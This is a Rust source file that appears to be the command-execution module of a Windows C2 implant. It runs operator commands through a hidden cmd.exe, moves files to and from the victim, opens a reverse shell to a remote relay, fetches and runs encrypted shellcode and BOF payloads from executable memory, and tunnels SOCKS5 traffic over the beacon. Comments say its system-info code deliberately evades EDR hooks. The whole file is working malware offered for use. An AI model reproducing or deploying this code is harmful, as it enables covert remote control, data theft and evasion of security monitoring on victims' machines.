// exec.rs
// Dispatch incoming commands and execute shell commands via cmd.exe.
// Supported control commands:
//   DIE                                         — exit the process cleanly
//   SLEEP:<millis>                              — update beacon sleep interval
//   UPLOAD:<b64(remote_path)>:<b64(data)>       — write file to disk
//   REVSHELL:<host>:<port>:<8-hex-token>        — TCP reverse shell via station relay
//   !info                                       — dump process/host info via PEB/env/NT
// All other input is executed as a shell command via cmd.exe.

use base64::{engine::general_purpose::STANDARD as B64, Engine};
use std::ffi::c_void;
use std::io::{Read, Write};
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::sync::atomic::{AtomicU32, Ordering};
use windows::core::{PCSTR, PCWSTR};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::Networking::WinHttp::{
    WinHttpCloseHandle, WinHttpConnect, WinHttpOpen, WinHttpOpenRequest,
    WinHttpQueryDataAvailable, WinHttpReadData, WinHttpReceiveResponse, WinHttpSendRequest,
    WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_OPEN_REQUEST_FLAGS,
};
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE,
    PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateThread, WaitForSingleObject, THREAD_CREATION_FLAGS,
};

const CREATE_NO_WINDOW: u32 = 0x08000000;

/// Beacon sleep interval in milliseconds set by the C2 at runtime.
/// 0 = use built-in default random range.
pub static SLEEP_MS: AtomicU32 = AtomicU32::new(0);

pub fn run(cmd: &str) -> String {
    if cmd == "DIE" {
        std::process::exit(0);
    }
    if let Some(rest) = cmd.strip_prefix("SLEEP:") {
        return handle_sleep(rest);
    }
    if let Some(rest) = cmd.strip_prefix("UPLOAD:") {
        return handle_upload(rest);
    }
    if let Some(rest) = cmd.strip_prefix("REVSHELL:") {
        return handle_revshell(rest);
    }
    if let Some(rest) = cmd.strip_prefix("DOWNLOAD:") {
        return handle_download(rest);
    }
    if let Some(rest) = cmd.strip_prefix("SHELLCODE:") {
        return handle_shellcode(rest);
    }
    if let Some(rest) = cmd.strip_prefix("SHELLCODE_INLINE:") {
        return handle_shellcode_inline(rest);
    }
    if let Some(rest) = cmd.strip_prefix("BOF_INLINE:") {
        return handle_bof_inline(rest);
    }
    if let Some(rest) = cmd.strip_prefix("INJECT:") {
        return crate::inject::handle_inject(rest);
    }
    if let Some(rest) = cmd.strip_prefix("SOCKS5_START:") {
        return handle_socks5(rest);
    }
    if cmd == "!info" {
        return handle_info();
    }
    shell(cmd)
}

fn handle_sleep(arg: &str) -> String {
    match arg.trim().parse::<u32>() {
        Ok(ms) => {
            SLEEP_MS.store(ms, Ordering::Relaxed);
            format!("sleep interval updated to {}ms", ms)
        }
        Err(_) => "sleep error: invalid interval".to_string(),
    }
}

fn handle_upload(args: &str) -> String {
    // args = "<b64(remote_path)>:<b64(file_data)>"
    // Both path and data are base64-encoded so neither segment contains ':'
    let Some((b64_path, b64_data)) = args.split_once(':') else {
        return "upload error: malformed payload".to_string();
    };
    let remote_path = match B64.decode(b64_path) {
        Ok(b) => match String::from_utf8(b) {
            Ok(s)  => s,
            Err(_) => return "upload error: invalid path encoding".to_string(),
        },
        Err(e) => return format!("upload error: path decode failed: {e}"),
    };
    let data = match B64.decode(b64_data) {
        Ok(d)  => d,
        Err(e) => return format!("upload error: data decode failed: {e}"),
    };
    match std::fs::File::create(&remote_path) {
        Ok(mut f) => match f.write_all(&data) {
            Ok(_)  => format!("uploaded {} bytes to {}", data.len(), remote_path),
            Err(e) => format!("upload error: write failed: {e}"),
        },
        Err(e) => format!("upload error: could not create {}: {e}", remote_path),
    }
}

fn handle_revshell(arg: &str) -> String {
    // arg = "host:port:hextoken"  (token is 8 hex chars = 4 bytes)
    let parts: Vec<&str> = arg.trim().splitn(3, ':').collect();
    let (host, port_str, token_hex) = match parts.as_slice() {
        [h, p, t] => (*h, *p, *t),
        _ => return "revshell: expected host:port:token".to_string(),
    };
    let port: u16 = match port_str.parse() {
        Ok(p)  => p,
        Err(_) => return format!("revshell: invalid port '{port_str}'"),
    };
    if token_hex.len() != 8 {
        return "revshell: token must be 8 hex chars".to_string();
    }
    let token: Vec<u8> = (0..8)
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(&token_hex[i..i + 2], 16).ok())
        .collect();
    if token.len() != 4 {
        return "revshell: invalid token".to_string();
    }

    use std::net::TcpStream;
    use std::process::{Command as Cmd, Stdio};
    use std::thread;

    // Connect to relay and present session token
    let mut relay = match TcpStream::connect(format!("{host}:{port}")) {
        Ok(s)  => s,
        Err(e) => return format!("revshell: connect {host}:{port} failed: {e}"),
    };
    if relay.write_all(&token).is_err() {
        return "revshell: token send failed".to_string();
    }

    // Spawn cmd.exe with piped stdio
    let mut child = match Cmd::new("cmd.exe")
        .creation_flags(CREATE_NO_WINDOW)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c)  => c,
        Err(e) => return format!("revshell: spawn failed: {e}"),
    };

    let mut child_stdin  = child.stdin.take().unwrap();
    let mut child_stdout = child.stdout.take().unwrap();
    let mut child_stderr = child.stderr.take().unwrap();

    // relay → cmd stdin
    let r_in = relay.try_clone().unwrap();
    let t_in = thread::spawn(move || {
        let mut sock = r_in;
        let mut buf  = [0u8; 1024];
        loop {
            match sock.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => if child_stdin.write_all(&buf[..n]).is_err() { break },
            }
        }
    });

    // cmd stdout → relay
    let r_out = relay.try_clone().unwrap();
    let t_out = thread::spawn(move || {
        let mut sock = r_out;
        let mut buf  = [0u8; 1024];
        loop {
            match child_stdout.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => if sock.write_all(&buf[..n]).is_err() { break },
            }
        }
    });

    // cmd stderr → relay
    let r_err = relay.try_clone().unwrap();
    let t_err = thread::spawn(move || {
        let mut sock = r_err;
        let mut buf  = [0u8; 1024];
        loop {
            match child_stderr.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => if sock.write_all(&buf[..n]).is_err() { break },
            }
        }
    });

    // Block until stdout relay ends (operator closed connection or process exited)
    let _ = t_out.join();

    // Kill child, clean up
    let _ = child.kill();
    let _ = child.wait();
    let _ = t_in.join();
    let _ = t_err.join();

    "revshell: session ended".to_string()
}

fn handle_download(arg: &str) -> String {
    // arg = base64(remote_path)
    let remote_path = match B64.decode(arg.trim()).ok()
        .and_then(|b| String::from_utf8(b).ok())
    {
        Some(p) => p,
        None    => return "ERR:invalid path encoding".to_string(),
    };
    match std::fs::read(&remote_path) {
        Ok(data) => format!("FILE:{}", B64.encode(&data)),
        Err(e)   => format!("ERR:{}: {e}", remote_path),
    }
}

// ── WinHTTP raw-bytes download ─────────────────────────────────────────────

fn to_wide_exec(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn parse_url_exec(url: &str) -> Option<(String, u16, String)> {
    let url = url.trim_end_matches('/');
    let is_https = url.starts_with("https://");
    let rest = url.strip_prefix("http://").or_else(|| url.strip_prefix("https://"))?;
    let default_port: u16 = if is_https { 443 } else { 80 };
    let (authority, path) = match rest.find('/') {
        Some(i) => (&rest[..i], rest[i..].to_string()),
        None    => (rest, "/".to_string()),
    };
    let (host, port) = match authority.rfind(':') {
        Some(i) => (authority[..i].to_string(), authority[i+1..].parse().unwrap_or(default_port)),
        None    => (authority.to_string(), default_port),
    };
    Some((host, port, path))
}

fn http_get_bytes(url: &str) -> Option<Vec<u8>> {
    let (host, port, path) = parse_url_exec(url)?;
    let agent_w = to_wide_exec("Mozilla/5.0");
    unsafe {
        let session = WinHttpOpen(
            PCWSTR(agent_w.as_ptr()),
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            PCWSTR::null(), PCWSTR::null(), 0,
        );
        if session.is_null() { return None; }

        let host_w  = to_wide_exec(&host);
        let connect = WinHttpConnect(session, PCWSTR(host_w.as_ptr()), port, 0);
        if connect.is_null() { let _ = WinHttpCloseHandle(session); return None; }

        let verb_w = to_wide_exec("GET");
        let path_w = to_wide_exec(&path);
        let hreq   = WinHttpOpenRequest(
            connect, PCWSTR(verb_w.as_ptr()), PCWSTR(path_w.as_ptr()),
            PCWSTR::null(), PCWSTR::null(), std::ptr::null(),
            WINHTTP_OPEN_REQUEST_FLAGS(0),
        );
        if hreq.is_null() {
            let _ = WinHttpCloseHandle(connect); let _ = WinHttpCloseHandle(session); return None;
        }

        let result = if WinHttpSendRequest(hreq, None, None, 0, 0, 0).is_ok()
            && WinHttpReceiveResponse(hreq, std::ptr::null_mut()).is_ok()
        {
            let mut data: Vec<u8> = Vec::new();
            loop {
                let mut avail = 0u32;
                if WinHttpQueryDataAvailable(hreq, &mut avail).is_err() || avail == 0 { break; }
                let mut buf  = vec![0u8; avail as usize];
                let mut read = 0u32;
                if WinHttpReadData(hreq, buf.as_mut_ptr() as *mut c_void, avail, &mut read).is_err() { break; }
                data.extend_from_slice(&buf[..read as usize]);
            }
            Some(data)
        } else { None };

        let _ = WinHttpCloseHandle(hreq);
        let _ = WinHttpCloseHandle(connect);
        let _ = WinHttpCloseHandle(session);
        result
    }
}

fn handle_shellcode(arg: &str) -> String {
    // arg = base64(url)
    let url = match B64.decode(arg.trim()).ok()
        .and_then(|b| String::from_utf8(b).ok())
    {
        Some(u) => u,
        None    => return "shellcode: invalid url encoding".to_string(),
    };
    let bytes = match http_get_bytes(&url) {
        Some(b) if !b.is_empty() => b,
        _ => return "shellcode: download failed".to_string(),
    };
    // AES-256-CBC decrypt using the implant's own key/IV
    let cfg = unsafe { &*(&raw const crate::config::IMPLANT_CONFIG) };
    let shellcode = match crate::crypto::decrypt_bytes(&bytes, cfg.key(), cfg.iv()) {
        Ok(sc)  => sc,
        Err(e)  => return format!("shellcode: decrypt failed: {e}"),
    };
    unsafe {
        let mem = VirtualAlloc(None, shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if mem.is_null() {
            return "shellcode: alloc failed".to_string();
        }
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
        let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(mem);
        let _ = CreateThread(None, 0, Some(thread_fn), None, THREAD_CREATION_FLAGS(0), None);
    }
    "shellcode: executing".to_string()
}

fn handle_shellcode_inline(arg: &str) -> String {
    // arg = base64(AES-256-CBC ciphertext)  — encrypted by the operator CLI
    let encrypted = match B64.decode(arg.trim()) {
        Ok(b)  => b,
        Err(_) => return "shellcode_inline: invalid encoding".to_string(),
    };
    let cfg = unsafe { &*(&raw const crate::config::IMPLANT_CONFIG) };
    let shellcode = match crate::crypto::decrypt_bytes(&encrypted, cfg.key(), cfg.iv()) {
        Ok(sc)  => sc,
        Err(e)  => return format!("shellcode_inline: decrypt failed: {e}"),
    };
    unsafe {
        let mem = VirtualAlloc(None, shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if mem.is_null() {
            return "shellcode_inline: alloc failed".to_string();
        }
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
        let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(mem);
        let _ = CreateThread(None, 0, Some(thread_fn), None, THREAD_CREATION_FLAGS(0), None);
    }
    "shellcode_inline: executing".to_string()
}

fn handle_bof_inline(arg: &str) -> String {
    // arg = base64(AES-256-CBC ciphertext of a BCOF bundle)
    //
    // Bundle header (40 bytes, cleartext after decrypt):
    //   [0..4]   "BCOF" magic
    //   [4..8]   entry_offset: u32 LE  — offset to loader stub entry point
    //   [8..12]  coff_offset:  u32 LE
    //   [12..16] coff_size:    u32 LE
    //   [16..20] args_offset:  u32 LE
    //   [20..24] args_size:    u32 LE
    //   [24..32] output_ptr:   u64 LE  (written by loader)
    //   [32..36] output_size:  u32 LE  (written by loader)
    //   [36..40] reserved:     u32
    let encrypted = match B64.decode(arg.trim()) {
        Ok(b)  => b,
        Err(_) => return "bof: invalid encoding".to_string(),
    };
    let cfg = unsafe { &*(&raw const crate::config::IMPLANT_CONFIG) };
    let bundle = match crate::crypto::decrypt_bytes(&encrypted, cfg.key(), cfg.iv()) {
        Ok(b)  => b,
        Err(e) => return format!("bof: decrypt failed: {e}"),
    };

    if bundle.len() < 40 || &bundle[0..4] != b"BCOF" {
        return "bof: invalid bundle magic".to_string();
    }
    let entry_offset = u32::from_le_bytes(bundle[4..8].try_into().unwrap()) as usize;
    if entry_offset >= bundle.len() {
        return "bof: bad entry_offset".to_string();
    }

    unsafe {
        // Allocate RWX and copy the whole bundle
        let mem = VirtualAlloc(
            None, bundle.len(),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        );
        if mem.is_null() {
            return "bof: alloc failed".to_string();
        }
        std::ptr::copy_nonoverlapping(bundle.as_ptr(), mem as *mut u8, bundle.len());

        // Thread entry = bundle_base + entry_offset
        let entry_ptr = (mem as usize + entry_offset) as *mut c_void;
        let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 =
            std::mem::transmute(entry_ptr);

        let thread = match CreateThread(
            None, 0, Some(thread_fn), Some(mem),
            THREAD_CREATION_FLAGS(0), None,
        ) {
            Ok(h)  => h,
            Err(_) => {
                VirtualFree(mem, 0, MEM_RELEASE).ok();
                return "bof: thread create failed".to_string();
            }
        };

        // Wait up to 60 seconds for the BOF to finish
        WaitForSingleObject(thread, 60_000);
        CloseHandle(thread).ok();

        // Read output written by loader into bundle header[24..36]
        let hdr = mem as *const u8;
        let output_ptr  = u64::from_le_bytes(*(hdr.add(24) as *const [u8; 8])) as *const u8;
        let output_size = u32::from_le_bytes(*(hdr.add(32) as *const [u8; 4])) as usize;

        let result = if !output_ptr.is_null() && output_size > 0 {
            let slice = std::slice::from_raw_parts(output_ptr, output_size);
            let s = String::from_utf8_lossy(slice).trim_end_matches('\0').to_string();
            // Free the output buffer that the loader allocated
            VirtualFree(output_ptr as *mut c_void, 0, MEM_RELEASE).ok();
            if s.is_empty() { "bof: completed (no output)".to_string() } else { s }
        } else {
            "bof: completed (no output)".to_string()
        };

        // Free the bundle allocation
        VirtualFree(mem, 0, MEM_RELEASE).ok();
        result
    }
}

// ── !info — non-standard sysinfo ─────────────────────────────────────────────
//
// Avoids commonly-monitored Win32 wrappers:
//   GetCurrentProcessId  → TEB.ClientId via GS register
//   GetComputerName      → env var COMPUTERNAME
//   GetUserName          → env var USERNAME
//   GetVersionEx         → PEB.OSMajorVersion/MinorVersion/BuildNumber
//   OpenProcessToken +   → NtOpenProcessToken + NtQueryInformationToken
//   GetTokenInformation    (ntdll native layer, below most EDR hooks)

fn handle_info() -> String {
    let image_path = unsafe { info_image_path() };
    let pid        = unsafe { info_pid() };
    let (major, minor, build) = unsafe { info_os_version() };
    let username   = std::env::var("USERNAME").unwrap_or_else(|_| "?".into());
    let hostname   = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "?".into());
    let domain     = std::env::var("USERDNSDOMAIN")
        .or_else(|_| std::env::var("USERDOMAIN"))
        .unwrap_or_else(|_| "?".into());
    let integrity  = unsafe { info_integrity_level() };
    format!(
        "Process  : {}\nPID      : {}\nUser     : {}\\{}\nHost     : {}\nOS       : {}.{} (Build {})\nIntegrity: {}",
        image_path, pid, domain, username, hostname, major, minor, build, integrity
    )
}

/// Read the process image path from PEB → ProcessParameters → ImagePathName.
/// GS:[0x60] = PEB; PEB+0x20 = ProcessParameters;
/// ProcessParameters+0x60 = ImagePathName (UNICODE_STRING: Length@+0, Buffer@+8).
unsafe fn info_image_path() -> String {
    let peb: usize;
    core::arch::asm!("mov {}, qword ptr gs:[0x60]", out(reg) peb, options(nostack));
    if peb == 0 { return "?".into(); }
    let peb = peb as *const u8;
    let params = *(peb.add(0x20) as *const usize) as *const u8;
    if params.is_null() { return "?".into(); }
    let byte_len = *(params.add(0x60) as *const u16) as usize;
    let buf      = *(params.add(0x68) as *const *const u16);
    if buf.is_null() || byte_len == 0 { return "?".into(); }
    String::from_utf16_lossy(std::slice::from_raw_parts(buf, byte_len / 2))
}

/// Read the current process ID from TEB.ClientId via GS:[0x40].
unsafe fn info_pid() -> u32 {
    let pid: usize;
    core::arch::asm!("mov {}, qword ptr gs:[0x40]", out(reg) pid, options(nostack));
    pid as u32
}

/// Read OS version numbers from PEB+0x118/0x11C/0x120.
unsafe fn info_os_version() -> (u32, u32, u16) {
    let peb: usize;
    core::arch::asm!("mov {}, qword ptr gs:[0x60]", out(reg) peb, options(nostack));
    if peb == 0 { return (0, 0, 0); }
    let peb = peb as *const u8;
    let major = *(peb.add(0x118) as *const u32);
    let minor = *(peb.add(0x11C) as *const u32);
    let build = *(peb.add(0x120) as *const u16);
    (major, minor, build)
}

/// Query the token integrity level via NT native APIs (ntdll).
/// Uses NtOpenProcessToken + NtQueryInformationToken (TokenIntegrityLevel=25).
unsafe fn info_integrity_level() -> String {
    type FnNtOpenToken  = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
    type FnNtQueryToken = unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;
    type FnNtClose      = unsafe extern "system" fn(*mut c_void) -> i32;

    let ntdll = match GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr())).ok() {
        Some(h) => h,
        None    => return "?".into(),
    };

    let proc = match GetProcAddress(ntdll, PCSTR(b"NtOpenProcessToken\0".as_ptr())) {
        Some(p) => p, None => return "?".into(),
    };
    let fn_open: FnNtOpenToken = std::mem::transmute_copy(&proc);

    let proc = match GetProcAddress(ntdll, PCSTR(b"NtQueryInformationToken\0".as_ptr())) {
        Some(p) => p, None => return "?".into(),
    };
    let fn_query: FnNtQueryToken = std::mem::transmute_copy(&proc);

    let proc = match GetProcAddress(ntdll, PCSTR(b"NtClose\0".as_ptr())) {
        Some(p) => p, None => return "?".into(),
    };
    let fn_close: FnNtClose = std::mem::transmute_copy(&proc);

    // Open the current process token (pseudo-handle = -1); TOKEN_QUERY = 0x0008
    let mut token: *mut c_void = std::ptr::null_mut();
    if fn_open(-1isize as *mut c_void, 0x0008, &mut token) < 0 {
        return "?".into();
    }

    // TokenIntegrityLevel = 25; result is TOKEN_MANDATORY_LABEL { SID_AND_ATTRIBUTES { Sid, Attrs } }
    let mut buf    = [0u8; 64];
    let mut retlen = 0u32;
    let status = fn_query(token, 25, buf.as_mut_ptr() as *mut c_void, buf.len() as u32, &mut retlen);
    fn_close(token);

    if status < 0 || retlen < 12 { return "?".into(); }

    // On x64: SID pointer occupies first 8 bytes of the buffer.
    // SID layout: Revision(1) SubAuthorityCount(1) IdentifierAuthority(6) SubAuthority[0](4)
    let sid = *(buf.as_ptr() as *const *const u8);
    if sid.is_null() { return "?".into(); }
    let rid = *(sid.add(8) as *const u32);
    match rid {
        0x1000 => "Low".into(),
        0x2000 => "Medium".into(),
        0x2100 => "Medium+".into(),
        0x3000 => "High".into(),
        0x4000 => "System".into(),
        other  => format!("0x{:04X}", other),
    }
}

fn shell(cmd: &str) -> String {
    match Command::new("cmd")
        .args(["/c", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            let combined = format!("{}{}", stdout, stderr).trim().to_string();
            if combined.is_empty() {
                "Output returned Null".to_string()
            } else {
                combined
            }
        }
        Err(e) => format!("Execution error: {e}"),
    }
}

// ── SOCKS5 proxy — multiplexed TCP tunnels over HTTP beacon ─────────────────

fn handle_socks5(task_id: &str) -> String {
    use std::collections::HashMap;
    use std::net::{TcpStream, ToSocketAddrs};
    use std::time::Duration;

    let cfg     = unsafe { &*(&raw const crate::config::IMPLANT_CONFIG) };
    let station = cfg.url();
    let key     = cfg.key();
    let iv      = cfg.iv();

    let mut channels: HashMap<u32, TcpStream> = HashMap::new();
    let mut pending: Vec<String> = Vec::new();

    loop {
        let mut out_frames = std::mem::take(&mut pending);
        let mut to_remove: Vec<u32> = Vec::new();

        for (&ch, stream) in channels.iter_mut() {
            let _ = stream.set_nonblocking(true);
            let mut buf = [0u8; 8192];
            loop {
                match stream.read(&mut buf) {
                    Ok(0) => { out_frames.push(format!("X:{ch}")); to_remove.push(ch); break; }
                    Ok(n) => { out_frames.push(format!("D:{ch}:{}", B64.encode(&buf[..n]))); }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => break,
                    Err(_) => { out_frames.push(format!("X:{ch}")); to_remove.push(ch); break; }
                }
            }
        }
        for ch in to_remove { channels.remove(&ch); }

        let payload   = out_frames.join("\n");
        let b64       = B64.encode(payload.as_bytes());
        let plaintext = format!("{task_id}:{b64}");
        let encrypted = crate::crypto::encrypt(&plaintext, key, iv);

        let enc_resp = crate::channel::task_io_exchange(&station, &encrypted);

        if let Some(enc_resp) = enc_resp {
            if let Ok(decrypted) = crate::crypto::decrypt(&enc_resp, key, iv) {
                for line in decrypted.lines() {
                    if line.is_empty() { continue; }
                    let colon1 = match line.find(':') {
                        Some(i) => i,
                        None => {
                            if line == "S" { return "socks5: stopped".to_string(); }
                            continue;
                        }
                    };
                    let op   = &line[..colon1];
                    let rest = &line[colon1 + 1..];

                    match op {
                        "C" => {
                            let parts: Vec<&str> = rest.splitn(3, ':').collect();
                            if parts.len() < 3 { continue; }
                            let ch: u32  = parts[0].parse().unwrap_or(0);
                            let host     = parts[1];
                            let port     = parts[2];
                            let target   = format!("{host}:{port}");
                            let connected = target.to_socket_addrs().ok()
                                .and_then(|mut a| a.next())
                                .and_then(|addr| TcpStream::connect_timeout(&addr, Duration::from_secs(10)).ok());
                            match connected {
                                Some(stream) => {
                                    channels.insert(ch, stream);
                                    pending.push(format!("K:{ch}"));
                                }
                                None => {
                                    pending.push(format!("E:{ch}:connection failed"));
                                }
                            }
                        }
                        "D" => {
                            let colon2 = match rest.find(':') { Some(i) => i, None => continue };
                            let ch: u32 = rest[..colon2].parse().unwrap_or(0);
                            let b64_data = &rest[colon2 + 1..];
                            if let Ok(data) = B64.decode(b64_data) {
                                let write_ok = channels.get_mut(&ch)
                                    .map(|s| s.write_all(&data).is_ok())
                                    .unwrap_or(true);
                                if !write_ok {
                                    channels.remove(&ch);
                                    pending.push(format!("X:{ch}"));
                                }
                            }
                        }
                        "X" => {
                            let ch: u32 = rest.parse().unwrap_or(0);
                            channels.remove(&ch);
                        }
                        "S" => {
                            channels.clear();
                            return "socks5: stopped".to_string();
                        }
                        _ => {}
                    }
                }
            }
        }

        std::thread::sleep(Duration::from_millis(500));
    }
}
